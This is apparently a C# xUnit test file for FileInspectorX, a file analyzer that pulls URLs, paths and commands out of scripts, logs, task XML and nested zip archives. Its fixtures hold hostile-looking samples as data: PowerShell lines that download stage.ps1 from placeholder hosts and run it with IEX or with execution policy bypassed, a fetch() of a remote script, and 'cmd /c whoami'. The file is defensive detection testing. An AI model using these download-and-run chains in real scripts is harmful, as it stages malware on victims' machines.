using System.IO.Compression;
using System.Runtime.InteropServices;
using Xunit;

namespace FileInspectorX.Tests;

public class ReferencesTests
{
    [Fact]
    public void Extract_TaskScheduler_Exec_CommandAndArgs()
    {
        string xml = "<Task><Actions><Exec><Command>cmd.exe</Command><Arguments>\"C:/Tools/do.bat\" https://example.com/x</Arguments></Exec></Actions></Task>";
        var p = Path.GetTempFileName() + ".xml";
        try {
            File.WriteAllText(p, xml);
            var a = FileInspector.Analyze(p);
            Assert.NotNull(a.References);
            Assert.Contains(a.References!, r => r.Kind == ReferenceKind.Command && r.Value.Contains("cmd.exe"));
            Assert.Contains(a.References!, r => r.Kind == ReferenceKind.FilePath && r.Value.Contains("do.bat"));
            Assert.Contains(a.References!, r => r.Kind == ReferenceKind.Url && r.Value.StartsWith("https://"));
        } finally { try { File.Delete(p); } catch { } }
    }

    [Fact]
    public void Extract_Gpo_ScriptsIni_CmdAndParams()
    {
        string ini = """
        [Startup]
        0Cmd=\\\\server\\share\\script.ps1
        0Parameters=-File C:\\Windows\\Temp\\payload.ps1
        1Cmd=%SystemRoot%\\System32\\wscript.exe
        1Parameters=//B //Nologo "C:\\Scripts\\login.vbs"
        """;
        var p = Path.GetTempFileName() + ".ini";
        try {
            File.WriteAllText(p, ini);
            var a = FileInspector.Analyze(p);
            Assert.NotNull(a.References);
            Assert.Contains(a.References!, r => r.Kind == ReferenceKind.FilePath && r.Value.StartsWith("\\\\"));
            // Ensure we extracted both UNC and local paths from parameters and commands
            Assert.Contains(a.References!, r => r.Kind == ReferenceKind.Command || r.Kind == ReferenceKind.FilePath);
        } finally { try { File.Delete(p); } catch { } }
    }

    [Fact]
    public void Extract_TaskScheduler_DoesNotFalsePositive_OnGenericXml()
    {
        string xml = "<Config><Command>cmd.exe</Command><Arguments>/c whoami</Arguments></Config>";
        var p = Path.GetTempFileName() + ".xml";
        try {
            File.WriteAllText(p, xml);
            var a = FileInspector.Analyze(p);
            var refs = a.References ?? Array.Empty<Reference>();
            Assert.DoesNotContain(refs, r => (r.SourceTag ?? string.Empty).StartsWith("task:", StringComparison.OrdinalIgnoreCase));
        } finally { try { File.Delete(p); } catch { } }
    }

    [Fact]
    public void Extract_ScriptReferences_RespectsReadCap()
    {
        var p = Path.GetTempFileName() + ".ps1";
        var early = "https://early.example.com/a";
        var late = "https://late.example.com/z";
        try {
            var text = "$u = '" + early + "'\n" + new string('x', 600_000) + "\n$v = '" + late + "'\n";
            File.WriteAllText(p, text);
            var a = FileInspector.Analyze(p);
            var refs = a.References ?? Array.Empty<Reference>();
            Assert.Contains(refs, r => r.Kind == ReferenceKind.Url && string.Equals(r.Value, early, StringComparison.OrdinalIgnoreCase));
            Assert.DoesNotContain(refs, r => r.Kind == ReferenceKind.Url && string.Equals(r.Value, late, StringComparison.OrdinalIgnoreCase));
        } finally { try { File.Delete(p); } catch { } }
    }

    [Fact]
    public void Extract_ScriptReferences_From_Disguised_Text_File_Uses_Detected_Type()
    {
        var p = Path.GetTempFileName() + ".txt";
        try
        {
            File.WriteAllText(p, """
                Invoke-WebRequest -Uri https://payload.example/stage.ps1 -OutFile C:\Windows\Temp\stage.ps1
                Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File C:\Windows\Temp\stage.ps1"
                """);

            var a = FileInspector.Analyze(p);
            var refs = a.References ?? Array.Empty<Reference>();

            Assert.Equal("ps1", a.DetectedExtension);
            Assert.Contains(refs, r => r.Kind == ReferenceKind.Url && string.Equals(r.Value, "https://payload.example/stage.ps1", StringComparison.OrdinalIgnoreCase));
            Assert.Contains(refs, r => string.Equals(r.SourceTag, "script:ps1", StringComparison.OrdinalIgnoreCase));
        }
        finally { try { File.Delete(p); } catch { } }
    }

    [Fact]
    public void Extract_HtmlReferences_From_Disguised_Text_File_Uses_Detected_Type()
    {
        var p = Path.GetTempFileName() + ".txt";
        try
        {
            File.WriteAllText(p, """
                <html><body>
                <a href="https://contoso.example/report">report</a>
                <script>fetch("https://payload.example/app.js");</script>
                </body></html>
                """);

            var a = FileInspector.Analyze(p);
            var refs = a.References ?? Array.Empty<Reference>();

            Assert.Equal("html", a.DetectedExtension);
            Assert.Contains(refs, r => r.Kind == ReferenceKind.Url && string.Equals(r.Value, "https://contoso.example/report", StringComparison.OrdinalIgnoreCase));
            Assert.Contains(refs, r => string.Equals(r.SourceTag, "html:href", StringComparison.OrdinalIgnoreCase));
        }
        finally { try { File.Delete(p); } catch { } }
    }

    [Fact]
    public void Extract_EventTextLog_References_From_Generic_Log_Text()
    {
        var p = Path.GetTempFileName() + ".log";
        try
        {
            File.WriteAllBytes(p, System.Text.Encoding.UTF8.GetBytes(
                "Event[0]\r\n" +
                "  Log Name: Application\r\n" +
                "  Source: Example.Service\r\n" +
                "  Event ID: 0\r\n" +
                "  Level: Error\0\r\n" +
                "  Description:\r\n" +
                "Failure reaching https://contoso.example:443/ from \\\\fileserver\\drop\\payload.ps1\r\n"));

            var a = FileInspector.Analyze(p);
            var refs = a.References ?? Array.Empty<Reference>();

            Assert.Equal("log", a.DetectedExtension);
            Assert.Contains(refs, r => r.Kind == ReferenceKind.Url && string.Equals(r.Value, "https://contoso.example:443/", StringComparison.OrdinalIgnoreCase));
            Assert.Contains(refs, r => r.Kind == ReferenceKind.FilePath && string.Equals(r.Value, "\\\\fileserver\\drop", StringComparison.OrdinalIgnoreCase));
            Assert.Contains(refs, r => string.Equals(r.SourceTag, "log:event-txt", StringComparison.OrdinalIgnoreCase));
        }
        finally { try { File.Delete(p); } catch { } }
    }

    [Fact]
    public void Extract_PlainLog_References_From_Generic_Log_Text()
    {
        var p = Path.GetTempFileName() + ".log";
        try
        {
            File.WriteAllText(p, """
                2026-03-17 09:12:00 ERROR failed downloading https://payload.example/app.msi
                2026-03-17 09:12:01 ERROR copied from \\fileserver\share\installer.msi
                """);

            var a = FileInspector.Analyze(p);
            var refs = a.References ?? Array.Empty<Reference>();

            Assert.Contains(refs, r => r.Kind == ReferenceKind.Url && string.Equals(r.Value, "https://payload.example/app.msi", StringComparison.OrdinalIgnoreCase));
            Assert.Contains(refs, r => r.Kind == ReferenceKind.FilePath && string.Equals(r.Value, "\\\\fileserver\\share", StringComparison.OrdinalIgnoreCase));
            Assert.Contains(refs, r => string.Equals(r.SourceTag, "log:text", StringComparison.OrdinalIgnoreCase));
        }
        finally { try { File.Delete(p); } catch { } }
    }

    [Fact]
    public void Extract_GenericTextReferences_DoesNot_Run_For_Renamed_Binary()
    {
        var p = Path.Combine(Path.GetTempPath(), "notepad-renamed-" + Guid.NewGuid().ToString("N") + ".txt");
        try
        {
            var (sampleBinaryPath, expectedDetectedExtension) = GetPlatformBinarySample();
            File.Copy(sampleBinaryPath, p, overwrite: true);

            var a = FileInspector.Analyze(p);
            var refs = a.References ?? Array.Empty<Reference>();

            Assert.Equal(expectedDetectedExtension, a.DetectedExtension);
            Assert.DoesNotContain(refs, r => string.Equals(r.SourceTag, "text:generic", StringComparison.OrdinalIgnoreCase));
            Assert.DoesNotContain(refs, r => string.Equals(r.SourceTag, "log:text", StringComparison.OrdinalIgnoreCase));
        }
        finally { try { File.Delete(p); } catch { } }

        static (string Path, string ExpectedDetectedExtension) GetPlatformBinarySample()
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                return (Path.Combine(Environment.SystemDirectory, "notepad.exe"), "exe");
            }

            if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
            {
                return ("/bin/ls", "macho");
            }

            return ("/bin/ls", "elf");
        }
    }

    [Fact]
    public void Extract_ArchiveInnerScriptSignals_Are_Promoted_To_InnerFindings()
    {
        var p = Path.Combine(Path.GetTempPath(), "archive-inner-signals-" + Guid.NewGuid().ToString("N") + ".zip");
        bool oldDeep = Settings.DeepContainerScanEnabled;
        try
        {
            Settings.DeepContainerScanEnabled = true;
            using (var fs = File.Create(p))
            using (var za = new ZipArchive(fs, ZipArchiveMode.Create, leaveOpen: false))
            {
                var entry = za.CreateEntry("bootstrap.txt");
                using var writer = new StreamWriter(entry.Open());
                writer.WriteLine("$u = 'https://payload.example/stage.ps1'");
                writer.WriteLine("$s = '\\\\fileserver\\drop\\stage.ps1'");
                writer.WriteLine("Invoke-WebRequest -Uri $u -OutFile $env:TEMP\\stage.ps1");
                writer.WriteLine("IEX (Get-Content $env:TEMP\\stage.ps1 -Raw)");
            }

            var a = FileInspector.Analyze(p);
            var findings = a.InnerFindings ?? Array.Empty<string>();
            var refs = a.References ?? Array.Empty<Reference>();

            Assert.Contains("archive:inner-script-exec", findings);
            Assert.Contains("archive:inner-script-download", findings);
            Assert.Contains("archive:inner-external-hosts", findings);
            Assert.Contains("archive:inner-unc", findings);
            Assert.Contains(findings, f => f.StartsWith("archive:inner-urls=", StringComparison.OrdinalIgnoreCase) && f.Contains("https://payload.example/stage.ps1", StringComparison.OrdinalIgnoreCase));
            Assert.Contains(findings, f => f.StartsWith("archive:inner-unc-samples=", StringComparison.OrdinalIgnoreCase) && f.Contains("\\\\fileserver\\drop", StringComparison.OrdinalIgnoreCase));
            Assert.Contains(findings, f => f.StartsWith("archive:inner-files=", StringComparison.OrdinalIgnoreCase) && f.Contains("bootstrap.txt (ps1)", StringComparison.OrdinalIgnoreCase));
            Assert.Contains(refs, r => r.Kind == ReferenceKind.Url && string.Equals(r.Value, "https://payload.example/stage.ps1", StringComparison.OrdinalIgnoreCase) && string.Equals(r.SourceTag, "archive:inner", StringComparison.OrdinalIgnoreCase));
            Assert.Contains(refs, r => r.Kind == ReferenceKind.FilePath && string.Equals(r.Value, "\\\\fileserver\\drop", StringComparison.OrdinalIgnoreCase) && string.Equals(r.SourceTag, "archive:inner", StringComparison.OrdinalIgnoreCase));
        }
        finally
        {
            Settings.DeepContainerScanEnabled = oldDeep;
            try { File.Delete(p); } catch { }
        }
    }

    [Fact]
    public void Extract_ArchiveInnerReferences_Respect_IncludeReferences_False()
    {
        var p = Path.Combine(Path.GetTempPath(), "archive-inner-refs-disabled-" + Guid.NewGuid().ToString("N") + ".zip");
        bool oldDeep = Settings.DeepContainerScanEnabled;
        try
        {
            Settings.DeepContainerScanEnabled = true;
            using (var fs = File.Create(p))
            using (var za = new ZipArchive(fs, ZipArchiveMode.Create, leaveOpen: false))
            {
                var entry = za.CreateEntry("bootstrap.txt");
                using var writer = new StreamWriter(entry.Open());
                writer.WriteLine("$u = 'https://payload.example/stage.ps1'");
                writer.WriteLine("$s = '\\\\fileserver\\drop\\stage.ps1'");
                writer.WriteLine("Invoke-WebRequest -Uri $u -OutFile $env:TEMP\\stage.ps1");
            }

            var a = FileInspector.Analyze(p, new FileInspector.DetectionOptions { IncludeReferences = false });
            var refs = a.References ?? Array.Empty<Reference>();

            Assert.Empty(refs);
        }
        finally
        {
            Settings.DeepContainerScanEnabled = oldDeep;
            try { File.Delete(p); } catch { }
        }
    }

    [Fact]
    public void Extract_NestedArchiveInnerScriptSignals_Are_Promoted_To_OuterArchive()
    {
        var outer = Path.Combine(Path.GetTempPath(), "archive-nested-inner-signals-" + Guid.NewGuid().ToString("N") + ".zip");
        var nested = Path.Combine(Path.GetTempPath(), "archive-nested-inner-payload-" + Guid.NewGuid().ToString("N") + ".zip");
        bool oldDeep = Settings.DeepContainerScanEnabled;
        try
        {
            Settings.DeepContainerScanEnabled = true;

            using (var fs = File.Create(nested))
            using (var za = new ZipArchive(fs, ZipArchiveMode.Create, leaveOpen: false))
            {
                var entry = za.CreateEntry("bootstrap.txt");
                using var writer = new StreamWriter(entry.Open());
                writer.WriteLine("$u = 'https://nested.example/stage.ps1'");
                writer.WriteLine("$s = '\\\\nestedserver\\drop\\stage.ps1'");
                writer.WriteLine("Invoke-WebRequest -Uri $u -OutFile $env:TEMP\\stage.ps1");
                writer.WriteLine("IEX (Get-Content $env:TEMP\\stage.ps1 -Raw)");
            }

            using (var fs = File.Create(outer))
            using (var za = new ZipArchive(fs, ZipArchiveMode.Create, leaveOpen: false))
            {
                var entry = za.CreateEntry("payload.zip");
                using var input = File.OpenRead(nested);
                using var output = entry.Open();
                input.CopyTo(output);
            }

            var a = FileInspector.Analyze(outer);
            var findings = a.InnerFindings ?? Array.Empty<string>();
            var refs = a.References ?? Array.Empty<Reference>();

            Assert.Contains("archive:inner-script-exec", findings);
            Assert.Contains("archive:inner-script-download", findings);
            Assert.Contains("archive:inner-external-hosts", findings);
            Assert.Contains("archive:inner-unc", findings);
            Assert.Contains(findings, f => f.StartsWith("archive:inner-files=", StringComparison.OrdinalIgnoreCase) && f.Contains("payload.zip (zip)", StringComparison.OrdinalIgnoreCase));
            Assert.Contains(refs, r => r.Kind == ReferenceKind.Url && string.Equals(r.Value, "https://nested.example/stage.ps1", StringComparison.OrdinalIgnoreCase) && string.Equals(r.SourceTag, "archive:inner", StringComparison.OrdinalIgnoreCase));
            Assert.Contains(refs, r => r.Kind == ReferenceKind.FilePath && string.Equals(r.Value, "\\\\nestedserver\\drop", StringComparison.OrdinalIgnoreCase) && string.Equals(r.SourceTag, "archive:inner", StringComparison.OrdinalIgnoreCase));
        }
        finally
        {
            Settings.DeepContainerScanEnabled = oldDeep;
            try { File.Delete(outer); } catch { }
            try { File.Delete(nested); } catch { }
        }
    }

    [Fact]
    public void Extract_NestedArchiveInnerExecutableMetadata_Is_Promoted_To_OuterArchive()
    {
        var outer = Path.Combine(Path.GetTempPath(), "archive-nested-exe-outer-" + Guid.NewGuid().ToString("N") + ".zip");
        var nested = Path.Combine(Path.GetTempPath(), "archive-nested-exe-inner-" + Guid.NewGuid().ToString("N") + ".zip");
        bool oldDeep = Settings.DeepContainerScanEnabled;
        try
        {
            Settings.DeepContainerScanEnabled = true;

            using (var fs = File.Create(nested))
            using (var za = new ZipArchive(fs, ZipArchiveMode.Create, leaveOpen: false))
            {
                var entry = za.CreateEntry("tool.exe");
                using var stream = entry.Open();
                stream.WriteByte((byte)'M');
                stream.WriteByte((byte)'Z');
                stream.Write(new byte[62], 0, 62);
            }

            using (var fs = File.Create(outer))
            using (var za = new ZipArchive(fs, ZipArchiveMode.Create, leaveOpen: false))
            {
                var entry = za.CreateEntry("payload.zip");
                using var input = File.OpenRead(nested);
                using var output = entry.Open();
                input.CopyTo(output);
            }

            var a = FileInspector.Analyze(outer);

            Assert.True((a.Flags & ContentFlags.ContainerContainsExecutables) != 0);
            Assert.Equal(1, a.InnerExecutablesSampled);
            Assert.NotNull(a.InnerExecutableExtCounts);
            Assert.True(a.InnerExecutableExtCounts!.TryGetValue("exe", out var exeCount) && exeCount == 1);
            Assert.NotNull(a.ArchivePreviewEntries);
            Assert.Contains(a.ArchivePreviewEntries!, p =>
                string.Equals(p.Name, "payload.zip > tool.exe", StringComparison.OrdinalIgnoreCase) &&
                string.Equals(p.DetectedExtension, "exe", StringComparison.OrdinalIgnoreCase));
        }
        finally
        {
            Settings.DeepContainerScanEnabled = oldDeep;
            try { File.Delete(outer); } catch { }
            try { File.Delete(nested); } catch { }
        }
    }

    [Fact]
    public void Extract_NestedArchiveInstallerPreview_Is_Promoted_To_OuterArchive()
    {
        var outer = Path.Combine(Path.GetTempPath(), "archive-nested-msi-outer-" + Guid.NewGuid().ToString("N") + ".zip");
        var nested = Path.Combine(Path.GetTempPath(), "archive-nested-msi-inner-" + Guid.NewGuid().ToString("N") + ".zip");
        bool oldDeep = Settings.DeepContainerScanEnabled;
        int oldDeepBytes = Settings.DeepContainerMaxEntryBytes;
        try
        {
            Settings.DeepContainerScanEnabled = true;
            Settings.DeepContainerMaxEntryBytes = 1_024;

            using (var fs = File.Create(nested))
            using (var za = new ZipArchive(fs, ZipArchiveMode.Create, leaveOpen: false))
            {
                var entry = za.CreateEntry("setup.msi");
                using var stream = entry.Open();
                var bytes = new byte[256 * 1024];
                using (var rng = System.Security.Cryptography.RandomNumberGenerator.Create())
                {
                    rng.GetBytes(bytes);
                }
                bytes[0] = (byte)'D';
                bytes[1] = (byte)'0';
                bytes[2] = (byte)'C';
                bytes[3] = (byte)'F';
                stream.Write(bytes, 0, bytes.Length);
            }

            Assert.True(new FileInfo(nested).Length > Settings.DeepContainerMaxEntryBytes);

            using (var fs = File.Create(outer))
            using (var za = new ZipArchive(fs, ZipArchiveMode.Create, leaveOpen: false))
            {
                var entry = za.CreateEntry("payload.zip");
                using var input = File.OpenRead(nested);
                using var output = entry.Open();
                input.CopyTo(output);
            }

            var a = FileInspector.Analyze(outer);

            Assert.True((a.Flags & ContentFlags.ContainerContainsInstallers) != 0);
            Assert.NotNull(a.ArchivePreviewEntries);
            Assert.Contains(a.ArchivePreviewEntries!, p =>
                string.Equals(p.Name, "payload.zip > setup.msi", StringComparison.OrdinalIgnoreCase) &&
                string.Equals(p.DetectedExtension, "msi", StringComparison.OrdinalIgnoreCase));
            Assert.NotNull(a.InnerExecutableExtCounts);
            Assert.True(a.InnerExecutableExtCounts!.TryGetValue("msi", out var msiCount) && msiCount == 1);
        }
        finally
        {
            Settings.DeepContainerScanEnabled = oldDeep;
            Settings.DeepContainerMaxEntryBytes = oldDeepBytes;
            try { File.Delete(outer); } catch { }
            try { File.Delete(nested); } catch { }
        }
    }
}
